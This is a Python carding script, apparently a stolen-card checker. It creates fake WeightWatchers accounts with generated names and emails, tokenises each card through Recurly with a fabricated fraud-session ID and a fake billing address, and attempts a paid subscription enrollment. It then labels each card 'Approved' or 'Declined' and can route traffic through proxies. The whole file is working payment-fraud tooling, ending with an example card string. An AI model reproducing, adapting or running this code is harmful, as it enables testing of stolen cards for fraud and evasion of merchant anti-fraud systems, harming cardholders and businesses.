import requests, sys, traceback, time, hashlib, random
from faker import Faker
fake = Faker("en_US") #Inicializa faker
################ lambdas ############
genemail = lambda: f"{fake.user_name().strip()}@{random.choice(['gmail.com','yahoo.com','hotmail.com'])}"
md5 = lambda text: hashlib.md5(text.encode()).hexdigest()
password = lambda:fake.password(length=12, special_chars=False, digits=True, upper_case=True, lower_case=True)
##########№###################№########
def names():
    return fake.first_name(), fake.last_name()
    
def main(card, proxy=None):
    with requests.Session() as session:
        try:
            if proxy:
            	pxs = {'http':proxy, 'https':proxy}
            	session.proxies.update(pxs)
            cc = card.replace("/", "|")
            num, mes, ano, cvv=cc.strip().split("|")
            if len(ano)==2:
                ano = f"20{ano}"
            if len(mes)==2:
                mes = mes[1:]
            email = genemail();fst, lst = names();hash=md5(password())
            headers = {  "ww-ssid": "en-US-1435253412.1769447","sec-ch-ua-platform": "\"Android\"", "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"","sec-ch-ua-mobile": "?1","ww-client": "rsw","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "accept": "application/json, text/plain, */*", "content-type": "application/json","accept-language": "es-MX,es;q=0.7","origin": "https://www.weightwatchers.com","priority": "u=1, i"}
            data= {'firstName': fst.strip(), 'lastName': lst.strip(), 'email': email, 'password': password(), 'timezone': 'America/Mexico_City', 'optin': 'email'}
            res = session.post("https://api.ww.com/account/v3/profile/register?market=en-US", headers=headers, json=data)
            id_token=res.json().get("id_token")
            headers = { "sec-ch-ua-platform": "\"Android\"", "user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "content-type": "application/x-www-form-urlencoded",  "accept-language": "es-MX,es;q=0.7", "origin": "https://api.recurly.com","referer": "https://api.recurly.com/js/v1/field.html", "priority": "u=1, i"}
            data = f"""fraud_session_id={hash}&first_name={fst.strip()}&last_name={lst.strip()}&address1=2300%20Pierce%20Street&city=Houston&state=TX&postal_code=77003&country=US&phone=8263981723&number={num}&fraud[0][processor]=kount&fraud[0][session_id]={hash}&browser[color_depth]=24&browser[java_enabled]=false&browser[language]=es-MX&browser[referrer_url]=https%3A%2F%2Fwww.weightwatchers.com%2Fus%2Fsignup%2Fa%2Fcheckout%3Fop%3D24137bb9-d595-499e-80e7-34e409c9c046%26own%3D37%26ob%3De2707f81-d9cf-4a58-b3e1-e34c247ca3f2%26returnPath%3D%252Ffind-my-plan%252Fresults%26assessment_type%3Dunified-assessment-v6%26bundleId%3De2707f81-d9cf-4a58-b3e1-e34c247ca3f2%26step%3D3%26aid%3D69779f652c5ce2b27967e42e%26switchRedirect%3D1&browser[screen_height]=712&browser[screen_width]=320&browser[time_zone_offset]=360&browser[user_agent]=Mozilla%2F5.0%20%28Android%2013%3B%20Mobile%3B%20rv%3A122.0%29%20Gecko%2F122.0%20Firefox%2F122.0&month={mes}&year={ano}&version=4.41.1&key=ewr1-shv8o27mJEHUWR0L6GVUWE&deviceId=YfX1MK7XyiWYOm4S&sessionId=ydh94qIN0quil9qt&instanceId=XmRsUPLIOTQBioYg"""
            res = session.post("https://api.recurly.com/js/v1/token", headers=headers, data=data)
            token = res.json().get("id")
            headers = { "ww-ssid": "en-US-1435253412.1769447", "sec-ch-ua-platform": "\"Android\"", "authorization": f"Bearer {id_token}","sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"", "sec-ch-ua-mobile": "?1","ww-client": "rsw","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36", "accept": "application/json, text/plain, */*", "content-type": "application/json", "sec-gpc": "1", "accept-language": "es-MX,es;q=0.7","origin": "https://www.weightwatchers.com","referer": "https://www.weightwatchers.com/", "priority": "u=1, i"}
            data = {'offerPlanId': '24137bb9-d595-499e-80e7-34e409c9c046', 'billingInfo': {'tokenId': token, 'paymentMethodType': 'creditCard'}}
            res = session.post("https://api.ww.com/sms/v1/subscriptions/enroll?locale=en-US&source=checkout", headers=headers, json=data)
            if "declined" in res.text or "error" in res.text or "fail" in res.text:
                return {"card": cc.strip(),"status": "Declined ❌", "message": {res.json().get("message")}}
            elif "CVV" in res.text:
                return {"card": cc.strip(),"status": "Approved ✅", "message": {res.json().get("message", "Premium started successfully")}}
            else:
                return {"card": cc.strip(),"status": "Approved ✅", "message": res.status_code}
        except Exception as e:
            return {"card": cc.strip(), "status": "Fail ⚠️", "message": e}
#Example ->
#pxs = "http://user:pass@host:port" or "http://ip:port"
print(main("4147098567014048|01|2027|569"
#proxy=pxs
))
